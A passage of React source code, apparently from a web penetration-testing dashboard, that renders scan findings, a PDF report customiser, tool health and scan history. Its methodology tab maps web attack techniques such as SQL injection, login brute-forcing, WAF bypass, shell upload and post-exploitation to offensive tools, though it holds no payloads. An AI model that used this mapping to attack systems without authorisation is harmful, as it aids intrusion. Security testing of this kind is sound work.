                  </div>
                )}

                {/* Findings list (when scan succeeded and found issues) */}
                {Array.isArray(res.findings) && res.findings.length > 0 && (
                  <div style={{marginBottom:10}}>
                    <div style={{fontSize:10,fontWeight:800,color:"#94a3b8",letterSpacing:1.5,marginBottom:6}}>
                      FINDINGS ({res.findings.length})
                    </div>
                    <div style={{maxHeight:280,overflowY:"auto",display:"flex",flexDirection:"column",gap:6}}>
                      {res.findings.slice(0,50).map((f,fi)=>{
                        const sev = String(f.severity||"INFO").toUpperCase();
                        const sevColor = sev==="CRITICAL"?"#dc2626":sev==="HIGH"?"#f97316":sev==="MEDIUM"?"#eab308":sev==="LOW"?"#22c55e":"#94a3b8";
                        return (
                          <div key={fi} style={{padding:"8px 10px",background:"#020617",border:"1px solid #1e293b",borderRadius:5,borderLeft:`3px solid ${sevColor}`}}>
                            <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:3}}>
                              <span style={{fontSize:9,fontWeight:800,color:sevColor,background:sevColor+"22",padding:"1px 6px",borderRadius:3,letterSpacing:1}}>{sev}</span>
                              {f.cvss && <span style={{fontSize:9,color:"#94a3b8"}}>CVSS {f.cvss}</span>}
                              {f.cve && f.cve !== "N/A" && <span style={{fontSize:9,color:"#60a5fa",fontFamily:"monospace"}}>{f.cve}</span>}
                            </div>
                            <div style={{fontSize:11,color:"#cbd5e1"}}>{f.detail}</div>
                            {f.remediation && (
                              <div style={{fontSize:10,color:"#86efac",marginTop:4,fontStyle:"italic"}}>
                                Fix: {f.remediation}
                              </div>
                            )}
                          </div>
                        );
                      })}
                      {res.findings.length > 50 && (
                        <div style={{fontSize:10,color:"#64748b",textAlign:"center",padding:6,fontStyle:"italic"}}>
                          ... and {res.findings.length - 50} more findings (download full PDF report)
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {/* Plain-success — no error, no findings, no vuln flag */}
                {!res.error && !res.detail && (!res.findings || res.findings.length === 0) && !res.vulnerable && (
                  <div style={{padding:"10px 12px",background:"rgba(34,197,94,0.08)",border:"1px solid rgba(34,197,94,0.30)",borderRadius:6,color:"#bbf7d0"}}>
                    Scan completed cleanly — no issues detected for this target.
                  </div>
                )}

                {/* Raw output snippet for debugging — collapsed by default
                    via <details>. The customer doesn't need it, but it's
                    there if they want to see what the scanner printed. */}
                {res.raw_output && (
                  <details style={{marginTop:8}}>
                    <summary style={{fontSize:10,color:"#64748b",cursor:"pointer",userSelect:"none"}}>
                      Show raw output ({String(res.raw_output).length} chars)
                    </summary>
                    <pre style={{marginTop:6,padding:"8px 10px",background:"#020617",border:"1px solid #1e293b",borderRadius:5,color:"#94a3b8",fontSize:10,maxHeight:200,overflow:"auto",whiteSpace:"pre-wrap",wordBreak:"break-all"}}>
                      {String(res.raw_output).substring(0,3000)}
                    </pre>
                  </details>
                )}
              </div>
            )}
            </React.Fragment>
          );
        })}
      </div>
      )}

      {/* FINDINGS TAB */}
      {tab==="findings" && finished && (() => {
        const allF=[];
        ["nikto","headers","ssl","cors","cookies","cms","xss"].forEach(p=>{
          if(allResults[p]?.findings) allResults[p].findings.forEach(f=>{if(f.severity!=="INFO")allF.push({...f,source:p});});
        });
        if(allResults["sqlmap"]?.vulnerable) allF.push({severity:"CRITICAL",cvss:"9.8",cve:"N/A",cwe:"CWE-89",detail:"SQL Injection detected",owasp:"A03:2021",remediation:"Use parameterized queries.",source:"sqlmap"});
        return (
          <div>
            <div style={{display:"flex",gap:8,marginBottom:12,flexWrap:"wrap"}}>
              {["CRITICAL","HIGH","MEDIUM","LOW"].map(s=>{
                const cnt=allF.filter(f=>f.severity===s).length;
                const c={CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a"}[s];
                return <div key={s} style={{background:c+"15",border:`1px solid ${c}`,borderRadius:6,padding:"8px 16px",textAlign:"center",minWidth:70}}>
                  <div style={{fontSize:22,fontWeight:700,color:c}}>{cnt}</div>
                  <div style={{fontSize:9,color:c,fontWeight:600}}>{s}</div>
                </div>;
              })}
              <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:6,padding:"8px 16px",textAlign:"center",minWidth:70}}>
                <div style={{fontSize:22,fontWeight:700,color:"#64748b"}}>{allF.length}</div>
                <div style={{fontSize:9,color:"#64748b",fontWeight:600}}>TOTAL</div>
              </div>
            </div>
            <div style={{display:"flex",flexDirection:"column",gap:6}}>
              {allF.length===0 && <div style={{textAlign:"center",padding:40,color:"#334155"}}>No findings — run a scan first!</div>}
              {allF.map((f,i)=>{
                const c={CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a",INFO:"#64748b"}[f.severity]||"#64748b";
                return (
                  <div key={i} style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:"14px 16px",borderLeft:`3px solid ${c}`}}>
                    <div style={{display:"flex",gap:8,marginBottom:6,flexWrap:"wrap",alignItems:"center"}}>
                      <span style={{background:c+"20",color:c,fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.severity}</span>
                      {f.cve&&f.cve!=="N/A"&&<span style={{background:"#fef2f2",color:"#dc2626",fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>CVE: {f.cve}</span>}
                      {f.cwe&&<span style={{background:"#f5f3ff",color:"#7c3aed",fontSize:9,fontWeight:700,padding:"2px 8px",borderRadius:3}}>{f.cwe}</span>}
                      <span style={{fontSize:9,color:"#64748b"}}>CVSS: {f.cvss||"N/A"}</span>
                      <span style={{fontSize:9,color:"#475569",background:"#020617",padding:"2px 6px",borderRadius:3,border:"1px solid #1e293b"}}>{f.owasp}</span>
                      <span style={{marginLeft:"auto",fontSize:9,color:"#3b82f6",fontFamily:"monospace"}}>via {f.source}</span>
                    </div>
                    <div style={{fontSize:12,color:"#e2e8f0",marginBottom:8}}>{f.detail}</div>
                    <div style={{background:"#052e16",border:"1px solid #166534",borderRadius:4,padding:"6px 10px",fontSize:11,color:"#4ade80"}}>
                      <strong>Fix:</strong> {f.remediation}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        );
      })()}
      {tab==="findings" && !finished && <div style={{textAlign:"center",padding:60,color:"#334155",fontSize:13}}>Run a pentest first to see findings here.</div>}

      {/* METHODOLOGY TAB */}
      {tab==="methodology" && (
        <div style={{display:"flex",flexDirection:"column",gap:8}}>
          <div style={{background:"#0c1a3d",border:"1px solid #1e3a8a",borderRadius:8,padding:"12px 16px",marginBottom:4}}>
            <div style={{fontSize:13,fontWeight:700,color:"#93c5fd",marginBottom:4}}>📚 WAPT Methodology — 15 Categories</div>
            <div style={{fontSize:11,color:"#475569"}}>✅ = Tool available in your platform | ⚠ = Partially covered | ❌ = Manual/external tool needed</div>
          </div>
          {[
            {num:"01",cat:"Web Fundamentals",icon:"🌐",color:"#3b82f6",tools:[
              {name:"HTTP/HTTPS Headers Analysis",tool:"curl",status:"✅",desc:"Security headers check — Phase 6"},
              {name:"TLS/SSL Misconfigurations",tool:"sslscan",status:"✅",desc:"SSL/TLS scan — Phase 5"},
              {name:"CORS Bypass Testing",tool:"curl",status:"✅",desc:"CORS test — Phase 8"},
              {name:"Cookie & Session Analysis",tool:"curl",status:"✅",desc:"Cookie flags check — Phase 7"},
              {name:"JWT Token Analysis",tool:"manual",status:"❌",desc:"Use jwt.io or Burp Suite manually"},
            ]},
            {num:"02",cat:"Recon & Enumeration",icon:"🔍",color:"#22c55e",tools:[
              {name:"Subdomain Enumeration",tool:"sublist3r",status:"✅",desc:"Subdomain discovery — Phase 10"},
              {name:"Directory Brute-Force",tool:"gobuster",status:"✅",desc:"Dir enumeration — Phase 9"},
              {name:"Technology Fingerprinting",tool:"whatweb",status:"✅",desc:"Tech stack — Phase 2"},
              {name:"DNS Enumeration",tool:"dig/dnsrecon",status:"✅",desc:"DNS records — Phase 14"},
              {name:"Virtual Host Discovery",tool:"ffuf",status:"✅",desc:"ffuf vhost fuzzing — available"},
              {name:"Parameter Discovery",tool:"arjun",status:"✅",desc:"arjun parameter discovery — available"},
            ]},
            {num:"03",cat:"Tools Mastery",icon:"⚙️",color:"#f59e0b",tools:[
              {name:"WAF Detection",tool:"wafw00f",status:"✅",desc:"WAF check — Phase 1"},
              {name:"CMS Detection",tool:"whatweb",status:"✅",desc:"CMS scan — Phase 3"},
              {name:"Nuclei Templates",tool:"nuclei",status:"✅",desc:"nuclei 3.8.0 — template-based scanning"},
              {name:"Custom Python Scripts",tool:"python",status:"⚠",desc:"Use Kali terminal for custom scripts"},
            ]},
            {num:"04",cat:"Injection Attacks",icon:"💉",color:"#dc2626",tools:[
              {name:"SQL Injection (Error-based)",tool:"sqlmap",status:"✅",desc:"SQLMap auto — Phase 13"},
              {name:"Blind SQL Injection",tool:"sqlmap",status:"✅",desc:"SQLMap --level=2 flag enabled"},
              {name:"Time-based SQLi",tool:"sqlmap",status:"✅",desc:"SQLMap handles time-based automatically"},
              {name:"XSS (Reflected/Stored)",tool:"xsser",status:"✅",desc:"XSS test — Phase 11"},
              {name:"Command Injection",tool:"manual",status:"❌",desc:"Test manually via Burp Repeater"},
              {name:"SSTI (Template Injection)",tool:"manual",status:"❌",desc:"Use tplmap: pip install tplmap"},
              {name:"NoSQL Injection",tool:"manual",status:"❌",desc:"Manual testing with Burp Suite"},
            ]},
            {num:"05",cat:"XSS & Client-Side",icon:"🌐",color:"#a855f7",tools:[
              {name:"Reflected XSS",tool:"xsser",status:"✅",desc:"XSS automated test — Phase 11"},
              {name:"DOM XSS",tool:"manual",status:"❌",desc:"Manual browser testing required"},
              {name:"CSP Analysis",tool:"curl",status:"✅",desc:"Checked in headers scan — Phase 6"},
              {name:"Clickjacking",tool:"curl",status:"✅",desc:"X-Frame-Options checked — Phase 6"},
              {name:"XSS Filter Evasion",tool:"xsser",status:"⚠",desc:"xsser has built-in evasion payloads"},
            ]},
            {num:"06",cat:"Auth & Authorization",icon:"🔐",color:"#f97316",tools:[
              {name:"Brute Force Login",tool:"hydra",status:"✅",desc:"Hydra — Password Attacks module"},
              {name:"Cookie Security",tool:"curl",status:"✅",desc:"HttpOnly/Secure flags — Phase 7"},
              {name:"Session Analysis",tool:"curl",status:"⚠",desc:"Basic session check in cookies scan"},
              {name:"IDOR Testing",tool:"manual",status:"❌",desc:"Manual testing with Burp Repeater"},
              {name:"MFA Bypass",tool:"manual",status:"❌",desc:"Manual testing required"},
              {name:"Privilege Escalation",tool:"manual",status:"❌",desc:"Manual logic testing"},
            ]},
            {num:"07",cat:"API Security",icon:"📡",color:"#06b6d4",tools:[
              {name:"API Endpoint Discovery",tool:"gobuster",status:"✅",desc:"gobuster finds API endpoints — Phase 9"},
              {name:"REST API Testing",tool:"curl",status:"⚠",desc:"Basic curl tests in headers scan"},
              {name:"GraphQL Attacks",tool:"manual",status:"❌",desc:"Use GraphQL Voyager + Burp Suite"},
              {name:"BOLA/IDOR",tool:"manual",status:"❌",desc:"Manual testing required"},
              {name:"Rate Limit Bypass",tool:"manual",status:"❌",desc:"Test with Burp Intruder"},
              {name:"API Fuzzing",tool:"ffuf",status:"❌",desc:"Install ffuf for API fuzzing"},
            ]},
            {num:"08",cat:"File & Resource Attacks",icon:"📁",color:"#84cc16",tools:[
              {name:"File Upload Testing",tool:"manual",status:"❌",desc:"Upload shell via Burp Suite"},
              {name:"Path Traversal (LFI/RFI)",tool:"nikto",status:"⚠",desc:"nikto checks basic LFI — Phase 12"},
              {name:"Directory Listing",tool:"gobuster+nikto",status:"✅",desc:"Both tools check this automatically"},
              {name:"Backup File Leakage",tool:"gobuster",status:"✅",desc:"gobuster finds .bak .zip .conf files"},
              {name:"Deserialization",tool:"manual",status:"❌",desc:"Use ysoserial manually"},
            ]},
            {num:"09",cat:"Business Logic",icon:"🔗",color:"#ec4899",tools:[
              {name:"Workflow Bypass",tool:"manual",status:"❌",desc:"Manual testing — think like attacker"},
              {name:"Payment Manipulation",tool:"manual",status:"❌",desc:"Intercept with Burp Suite proxy"},
              {name:"Race Conditions",tool:"manual",status:"❌",desc:"Use Burp Turbo Intruder"},
              {name:"Logic Flaws",tool:"manual",status:"❌",desc:"Requires deep manual analysis"},
              {name:"Parameter Tampering",tool:"manual",status:"❌",desc:"Modify hidden params in Burp Repeater"},
            ]},
            {num:"10",cat:"Modern Web Attacks",icon:"☁️",color:"#0ea5e9",tools:[
              {name:"SSRF Testing",tool:"curl",status:"⚠",desc:"Basic SSRF via curl payload test"},
              {name:"XXE (XML External Entity)",tool:"manual",status:"❌",desc:"Manual XML payload injection"},
              {name:"CSRF Testing",tool:"curl",status:"⚠",desc:"CORS/SameSite checked in Phase 8"},
              {name:"WebSocket Security",tool:"manual",status:"❌",desc:"Use Burp Suite WebSocket feature"},
            ]},
            {num:"11",cat:"CMS Pentesting",icon:"🧬",color:"#8b5cf6",tools:[
              {name:"CMS Detection",tool:"whatweb",status:"✅",desc:"CMS auto-detected — Phase 3"},
              {name:"WordPress Scanning",tool:"wpscan",status:"✅",desc:"wpscan 3.8.28 — auto WordPress audit"},
              {name:"Plugin Vulnerabilities",tool:"wpscan",status:"✅",desc:"wpscan checks plugin CVEs automatically"},
              {name:"Framework Detection",tool:"whatweb",status:"✅",desc:"whatweb detects Laravel/Django/etc"},
            ]},
            {num:"12",cat:"Fuzzing & Automation",icon:"🧪",color:"#f43f5e",tools:[
              {name:"Directory Fuzzing",tool:"gobuster",status:"✅",desc:"gobuster with common wordlist — Phase 9"},
              {name:"Parameter Fuzzing",tool:"ffuf/arjun",status:"✅",desc:"ffuf + arjun — both installed"},
              {name:"Subdomain Fuzzing",tool:"sublist3r",status:"✅",desc:"sublist3r — Phase 10"},
              {name:"Payload Fuzzing",tool:"wfuzz",status:"⚠",desc:"wfuzz available in Recon module"},
            ]},
            {num:"13",cat:"WAF Evasion & Bypass",icon:"🛡️",color:"#f97316",tools:[
              {name:"WAF Detection",tool:"wafw00f",status:"✅",desc:"wafw00f — Phase 1"},
              {name:"Encoding Tricks",tool:"sqlmap",status:"✅",desc:"sqlmap handles encoding automatically"},
              {name:"WAF Bypass Payloads",tool:"sqlmap",status:"✅",desc:"sqlmap --tamper scripts available"},
              {name:"IP Spoofing Headers",tool:"curl",status:"⚠",desc:"Manual X-Forwarded-For header test"},
            ]},
            {num:"14",cat:"Reporting & Methodology",icon:"📊",color:"#22c55e",tools:[
              {name:"PDF Report Generation",tool:"built-in",status:"✅",desc:"One-click PDF with CVSS/CWE/OWASP"},
              {name:"CSV Export",tool:"built-in",status:"✅",desc:"Export findings to spreadsheet"},
              {name:"Risk Score (0-100)",tool:"built-in",status:"✅",desc:"Auto-calculated risk score"},
              {name:"CVSS Scoring",tool:"built-in",status:"✅",desc:"CVSS assigned to each finding"},
              {name:"OWASP Mapping",tool:"built-in",status:"✅",desc:"Each finding mapped to OWASP Top 10"},
              {name:"CVE References",tool:"built-in",status:"✅",desc:"CVE IDs extracted from nikto output"},
            ]},
            {num:"15",cat:"Real-World Exploitation",icon:"💻",color:"#dc2626",tools:[
              {name:"Full DVWA Pentest",tool:"all-phases",status:"✅",desc:"Target: any web application"},
              {name:"SQL Injection on DVWA",tool:"sqlmap",status:"✅",desc:"Auto-tests SQLi on target"},
              {name:"XSS on DVWA",tool:"xsser",status:"✅",desc:"Auto-tests XSS on target"},
              {name:"Chain Vulnerabilities",tool:"manual+platform",status:"⚠",desc:"Use findings to chain attacks manually"},
              {name:"Post-Exploitation",tool:"manual",status:"❌",desc:"Use Metasploit Framework module"},
            ]},
          ].map((cat,ci)=>(
            <div key={ci} style={{background:"#0f172a",border:`1px solid ${cat.color}30`,borderRadius:8,overflow:"hidden"}}>
              <div style={{background:cat.color+"15",padding:"10px 16px",borderBottom:`1px solid ${cat.color}30`,display:"flex",alignItems:"center",gap:10}}>
                <span style={{fontSize:16}}>{cat.icon}</span>
                <span style={{fontSize:11,fontWeight:700,color:cat.color,letterSpacing:1}}>{cat.num}</span>
                <span style={{fontSize:13,fontWeight:700,color:"#f1f5f9"}}>{cat.cat}</span>
                <div style={{marginLeft:"auto",display:"flex",gap:4}}>
                  <span style={{fontSize:9,background:"#052e1650",color:"#22c55e",padding:"2px 6px",borderRadius:3}}>
                    ✅ {cat.tools.filter(t=>t.status==="✅").length}
                  </span>
                  <span style={{fontSize:9,background:"#78350f50",color:"#f59e0b",padding:"2px 6px",borderRadius:3}}>
                    ⚠ {cat.tools.filter(t=>t.status==="⚠").length}
                  </span>
                  <span style={{fontSize:9,background:"#7f1d1d50",color:"#f87171",padding:"2px 6px",borderRadius:3}}>
                    ❌ {cat.tools.filter(t=>t.status==="❌").length}
                  </span>
                </div>
              </div>
              <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:0}}>
                {cat.tools.map((t,ti)=>(
                  <div key={ti} style={{padding:"8px 16px",borderBottom:"1px solid #0f172a",borderRight:ti%2===0?"1px solid #0f172a":"none",display:"flex",alignItems:"flex-start",gap:8}}>
                    <span style={{fontSize:14,flexShrink:0,marginTop:1}}>{t.status}</span>
                    <div style={{flex:1}}>
                      <div style={{fontSize:11,fontWeight:600,color:"#e2e8f0",marginBottom:2}}>{t.name}</div>
                      <div style={{fontSize:9,color:"#3b82f6",fontFamily:"monospace",marginBottom:1}}>{t.tool}</div>
                      <div style={{fontSize:9,color:"#475569"}}>{t.desc}</div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      )}

    {/* ── PDF CUSTOMIZATION MODAL ─────────────────────────────── */}
    {showPDFModal && (
      <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.85)",zIndex:9999,display:"flex",alignItems:"center",justifyContent:"center",padding:20}}>
        <div style={{background:"#0a1628",border:"1px solid #1e3a8a",borderRadius:14,width:"100%",maxWidth:560,maxHeight:"90vh",overflowY:"auto",padding:28}}>
          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:22}}>
            <div style={{color:"#e2e8f0",fontWeight:800,fontSize:17}}>📄 Customize PDF Report</div>
            <button onClick={()=>setShowPDFModal(false)} style={{background:"none",border:"none",color:"#64748b",fontSize:20,cursor:"pointer"}}>✕</button>
          </div>

          {/* Company Name */}
          <div style={{marginBottom:16}}>
            <label style={{display:"block",color:"#94a3b8",fontSize:11,fontWeight:700,letterSpacing:2,textTransform:"uppercase",marginBottom:6}}>Company / Client Name</label>
            <input value={pdfConfig.companyName} onChange={e=>setPDFConfig(p=>({...p,companyName:e.target.value}))}
              placeholder="e.g. Acme Corporation"
              style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:7,padding:"10px 14px",color:"#e2e8f0",fontSize:13,outline:"none",boxSizing:"border-box"}}/>
          </div>

          {/* Reporter Name + Role */}
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:16}}>
            <div>
              <label style={{display:"block",color:"#94a3b8",fontSize:11,fontWeight:700,letterSpacing:2,textTransform:"uppercase",marginBottom:6}}>Prepared By (Name)</label>
              <input value={pdfConfig.reporterName} onChange={e=>setPDFConfig(p=>({...p,reporterName:e.target.value}))}
                placeholder="e.g. John Smith"
                style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:7,padding:"10px 14px",color:"#e2e8f0",fontSize:13,outline:"none",boxSizing:"border-box"}}/>
            </div>
            <div>
              <label style={{display:"block",color:"#94a3b8",fontSize:11,fontWeight:700,letterSpacing:2,textTransform:"uppercase",marginBottom:6}}>Job Title / Role</label>
              <input value={pdfConfig.reporterRole||""} onChange={e=>setPDFConfig(p=>({...p,reporterRole:e.target.value}))}
                placeholder="e.g. Senior Penetration Tester"
                style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:7,padding:"10px 14px",color:"#e2e8f0",fontSize:13,outline:"none",boxSizing:"border-box"}}/>
            </div>
          </div>

          {/* Report Date */}
          <div style={{marginBottom:16}}>
            <label style={{display:"block",color:"#94a3b8",fontSize:11,fontWeight:700,letterSpacing:2,textTransform:"uppercase",marginBottom:6}}>Report Date</label>
            <input type="date" onChange={e=>{
              const d = new Date(e.target.value);
              setPDFConfig(p=>({...p,date:d.toLocaleDateString("en-GB",{day:"2-digit",month:"long",year:"numeric"})}));
            }}
              style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:7,padding:"10px 14px",color:"#e2e8f0",fontSize:13,outline:"none",boxSizing:"border-box"}}/>
            <div style={{color:"#475569",fontSize:11,marginTop:4}}>Will show as: {pdfConfig.date}</div>
          </div>

          {/* Logo Upload */}
          <div style={{marginBottom:20}}>
            <label style={{display:"block",color:"#94a3b8",fontSize:11,fontWeight:700,letterSpacing:2,textTransform:"uppercase",marginBottom:6}}>Company Logo (PNG/JPG)</label>
            <div style={{display:"flex",gap:10,alignItems:"center"}}>
              <label style={{background:"#1e293b",border:"1px dashed #334155",borderRadius:7,padding:"10px 18px",color:"#93c5fd",fontSize:12,fontWeight:600,cursor:"pointer",display:"flex",alignItems:"center",gap:8}}>
                📁 Upload Logo
                <input type="file" accept="image/*" style={{display:"none"}} onChange={e=>{
                  const file = e.target.files[0];
                  if(!file) return;
                  const reader = new FileReader();
                  reader.onload = ev => setPDFConfig(p=>({...p,customLogo:ev.target.result, logoName:file.name}));
                  reader.readAsDataURL(file);
                }}/>
              </label>
              {pdfConfig.customLogo
                ? <div style={{display:"flex",alignItems:"center",gap:8}}>
                    <img src={pdfConfig.customLogo} alt="logo" style={{height:36,objectFit:"contain",borderRadius:4,background:"#fff",padding:2}}/>
                    <button onClick={()=>setPDFConfig(p=>({...p,customLogo:null,logoName:null}))} style={{background:"none",border:"none",color:"#ef4444",cursor:"pointer",fontSize:11}}>Remove</button>
                  </div>
                : <span style={{color:"#334155",fontSize:11}}>No logo — default CS badge will be used</span>
              }
            </div>
          </div>

          {/* Template Selector */}
          <div style={{marginBottom:24}}>
            <label style={{display:"block",color:"#94a3b8",fontSize:11,fontWeight:700,letterSpacing:2,textTransform:"uppercase",marginBottom:10}}>Report Color Theme</label>
            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10}}>
              {[
                {id:"standard",  label:"Standard",    accent:"#22c55e", desc:"Green — Default"},
                {id:"corporate", label:"Corporate",   accent:"#3b82f6", desc:"Blue — Professional"},
                {id:"red",       label:"Security Red", accent:"#ef4444", desc:"Red — High Alert"},
                {id:"gold",      label:"Premium Gold", accent:"#f59e0b", desc:"Gold — Executive"},
              ].map(t=>(
                <div key={t.id} onClick={()=>setPDFConfig(p=>({...p,template:t.id}))}
                  style={{background:pdfConfig.template===t.id?"#0f2a1a":"#0f172a",border:`2px solid ${pdfConfig.template===t.id?t.accent:"#1e293b"}`,borderRadius:8,padding:"12px 14px",cursor:"pointer",transition:"all 0.2s"}}>
                  <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:4}}>
                    <div style={{width:14,height:14,borderRadius:"50%",background:t.accent,flexShrink:0}}/>
                    <span style={{color:"#e2e8f0",fontWeight:700,fontSize:12}}>{t.label}</span>
                    {pdfConfig.template===t.id && <span style={{color:t.accent,fontSize:10,fontWeight:700,marginLeft:"auto"}}>✓ Selected</span>}
                  </div>
                  <div style={{color:"#64748b",fontSize:11}}>{t.desc}</div>
                  <div style={{display:"flex",gap:3,marginTop:8}}>
                    {[t.accent,"#0f172a","#1e293b","#e2e8f0"].map((c,i)=>(
                      <div key={i} style={{flex:1,height:6,background:c,borderRadius:2}}/>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Generate Button */}
          <button onClick={async ()=>{
            console.log("[VL] Generate clicked. Closing modal & calling dlPDF...");
            try {
              setShowPDFModal(false);
              await new Promise(r => setTimeout(r, 50));   // let React unmount the modal
              console.log("[VL] About to call dlPDF with config:", pdfConfig);
              const t0 = Date.now();
              dlPDF(pdfConfig);
              console.log("[VL] dlPDF returned after", Date.now()-t0, "ms");
              // Wait a beat — jsPDF's doc.save fires a synchronous download. If the
              // browser silently blocked it we never see anything in the UI.
              setTimeout(() => {
                console.log("[VL] If you did NOT see a download prompt, downloads are blocked. Click the download icon in the URL bar and allow this site.");
              }, 800);
            } catch (e) {
              console.error("[VL] Generate handler crashed:", e);
              alert("Report generation failed: " + (e.message || e) + "\n\nOpen DevTools (F12) → Console for the stack trace.");
            }
          }}
            style={{width:"100%",background:"#ef4444",border:"none",borderRadius:6,padding:"8px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer"}}>
            📄 Report
          </button>
        </div>
      </div>
    )}
    </div>
  );
}

function SystemHealth() {
  const [health,setHealth] = useState(null);
  const [loading,setLoading] = useState(true);
  useEffect(() => {
    api("/api/health").then(d => { setHealth(d); setLoading(false); }).catch(() => setLoading(false));
  }, []);
  if (loading) return <div style={{textAlign:"center",padding:40,color:"#475569",fontSize:13}}>Checking system health...</div>;
  if (!health)  return <div style={{textAlign:"center",padding:40,color:"#ef4444"}}>Cannot connect to backend</div>;
  const available = Object.values(health.free_tools).filter(t=>t.available).length;
  const total     = Object.keys(health.free_tools).length;
  return (
    <div className="fade">
      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:20,marginBottom:20}}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:16,flexWrap:"wrap",gap:10}}>
          <div>
            <h2 style={{fontSize:16,fontWeight:700,color:"#f1f5f9",marginBottom:2}}>System Health</h2>
            <p style={{fontSize:12,color:"#64748b"}}>Real-time tool availability on Kali backend</p>
          </div>
          <div style={{display:"flex",gap:8}}>
            <Badge label={available+"/"+total+" Available"} color="green"/>
            <Badge label={"v"+health.version} color="blue"/>
          </div>
        </div>
        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(220px,1fr))",gap:8}}>
          {Object.entries(health.free_tools).map(([name,info]) => (
            <div key={name} style={{background:"#020617",border:"1px solid "+(info.available?"#166534":"#7f1d1d"),borderRadius:6,padding:"10px 14px",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
              <div>
                <div style={{fontSize:12,fontWeight:600,color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",marginBottom:2}}>{name}</div>
                <div style={{fontSize:10,color:"#334155",fontFamily:"JetBrains Mono,monospace"}}>{info.path||"not found"}</div>
              </div>
              <div style={{width:8,height:8,borderRadius:"50%",background:info.available?"#22c55e":"#ef4444",flexShrink:0}}/>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function ScanHistory(props) {
  const token = props.token;
  const [scans,setScans] = useState([]);
  const [clearing,setClearing] = useState(false);
  const loadScans = () => {
    api("/api/scans","GET",null,token).then(d=>setScans(d.scans||[])).catch(()=>{});
  };
  useEffect(() => { loadScans(); /* eslint-disable-next-line */ }, [token]);

  const clearHistory = async () => {
    if (!window.confirm(`Delete ALL ${scans.length} scan(s)? This cannot be undone (last daily backup is in /root/backups on the VPS).`)) return;
    setClearing(true);
    try {
      const r = await api("/api/scans","DELETE",null,token);
      if (r.ok) {
        alert(`Cleared ${r.deleted} scan(s).`);
        loadScans();
      } else {
        alert("Error clearing: " + (r.error||"unknown"));
      }
    } catch (e) {
      alert("Network error: " + e.message);
    }
    setClearing(false);
  };

  return (
    <div className="fade">
      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
        <div style={{padding:"14px 20px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center",gap:12}}>
          <h2 style={{fontSize:15,fontWeight:600,color:"#f1f5f9"}}>Scan History</h2>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <Badge label={scans.length+" scans"} color="gray"/>
            {scans.length > 0 && (
              <button onClick={clearHistory} disabled={clearing}
                style={{padding:"6px 14px",fontSize:11,fontWeight:600,
                  background:clearing?"#374151":"#dc2626",color:"#fff",
                  border:"none",borderRadius:6,cursor:clearing?"wait":"pointer",
                  letterSpacing:.3}}>
                {clearing ? "Clearing..." : "🗑 Clear All"}
              </button>
            )}
          </div>
        </div>
        {scans.length > 0 ? (
          <table style={{width:"100%",borderCollapse:"collapse"}}>
            <thead>
              <tr style={{borderBottom:"1px solid #1e293b"}}>
                {["Tool","Target","Status","Time"].map(h => (
                  <th key={h} style={{padding:"8px 16px",textAlign:"left",fontSize:10,color:"#475569",fontWeight:600,letterSpacing:.5}}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {scans.map((s,i) => (
                <tr key={i} className="row" style={{borderBottom:"1px solid #0f172a",background:i%2===0?"#020617":"transparent"}}>
                  <td style={{padding:"10px 16px",fontSize:12,color:"#60a5fa",fontFamily:"JetBrains Mono,monospace"}}>{s.tool}</td>
                  <td style={{padding:"10px 16px",fontSize:12,color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace"}}>{s.target}</td>
                  <td style={{padding:"10px 16px"}}><Badge label={s.status} color={s.status==="complete"?"green":"red"} size="xs"/></td>
                  <td style={{padding:"10px 16px",fontSize:11,color:"#475569"}}>{new Date(s.timestamp).toLocaleString()}</td>
                </tr>
              ))}
            </tbody>
          </table>
        ) : <div style={{textAlign:"center",padding:40,color:"#334155",fontSize:13}}>No scans yet</div>}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
//  GUIDE MODULE
// ─────────────────────────────────────────────────────────────────────────────
function GuideModule() {
  const [tab, setTab] = useState("startup");
  const [copied, setCopied] = useState("");

  const copy = (text, key) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(key);
      setTimeout(() => setCopied(""), 2000);
    });
  };

  const G = "#22c55e"; const DIM = "#64748b"; const BG = "#0f172a"; const CARD = "#0a1628";
  const BORDER = "#1e293b";

  const tabBtn = (id, label, icon) => (
    <button onClick={() => setTab(id)} style={{
      padding:"9px 20px", borderRadius:8, border:"none", cursor:"pointer", fontSize:13, fontWeight:700,
